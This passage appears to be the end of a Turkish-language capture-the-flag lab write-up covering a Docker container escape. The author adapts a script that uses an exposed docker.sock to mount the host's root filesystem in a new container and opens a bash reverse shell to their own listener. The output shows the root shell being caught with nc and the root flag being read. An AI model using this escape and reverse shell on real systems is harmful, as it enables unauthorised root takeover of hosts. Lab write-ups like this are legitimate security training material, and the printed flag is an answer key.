{"Containers":-1,"Created":1640055479,"Id":"sha256:dd3b2a5dcb48ff61113592ed5ddd762581be4387c7bc552375a2159422aa6bf5","Labels":null,"ParentId":"","RepoDigests":["mysql@sha256:20575ecebe6216036d25dab5903808211f1e9ba63dc7825ac20cb975e34cfcae"],"RepoTags":["mysql:5.6"],"SharedSize":-1,"Size":302527523,"VirtualSize":302527523},
{"Containers":-1,"Created":1639694686,"Id":"sha256:0f7cb85ed8af5c33c1ca00367e4b1e4bfae6ec424f52bb04850af73fb19831d7","Labels":null,"ParentId":"","RepoDigests":["php@sha256:6eb4c063a055e144f4de1426b82526f60d393823cb017add32fb85d79f25b62b"],"RepoTags":["php:7.4-fpm-alpine"],"SharedSize":-1,"Size":82510913,"VirtualSize":82510913}]
```

script içerisindeki docker.sock dizini ve image bilgisini değiştirdim ve root kullanıcısından reverse shell almak için bash kodu ekledim.

```bash
#!/bin/bash

# you can see images availables with
# curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
# here we have sandbox:latest

# command executed when container is started
# change dir to tmp where the root fs is mount and execute reverse shell

cmd="[\"/bin/sh\",\"-c\",\"chroot /tmp sh -c \\\"bash -c 'bash -i &>/dev/tcp/10.10.14.73/12348 0<&1'\\\"\"]"

# create the container and execute command, bind the root filesystem to it, name the container peterpwn_root and execute as detached (-d)
curl -s -X POST --unix-socket /app/docker.sock -d "{\"Image\":\"laravel-app_main\",\"cmd\":$cmd,\"Binds\":[\"/:/tmp:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create?name=acivik

# start the container
curl -s -X POST --unix-socket /app/docker.sock "http://localhost/containers/acivik/start"
```

Scripti hedef sisteme taşıdım ve çalıştırdım.

```bash
application@4dae106254bf:/tmp$ ./escape.sh 
{"Id":"6c6b7ebc1a9e9ebb4b491e850b4e887e41ea01da28fb432779d12d5ea0bff766","Warnings":[]}
application@4dae106254bf:/tmp$
```

Host üzerinde root shelline sahibim flag dosyasını görüntüleyebilirim. 

```bash
root@acivik:~/tools# nc -lnvp 12348
listening on [any] 12348 ...
connect to [10.10.14.73] from (UNKNOWN) [10.10.11.171] 42718
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@6c6b7ebc1a9e:/# cat /root/root.txt
cat /root/root.txt
a119113c996ca962e5650fc4d5daa0d1
root@6c6b7ebc1a9e:/#
```
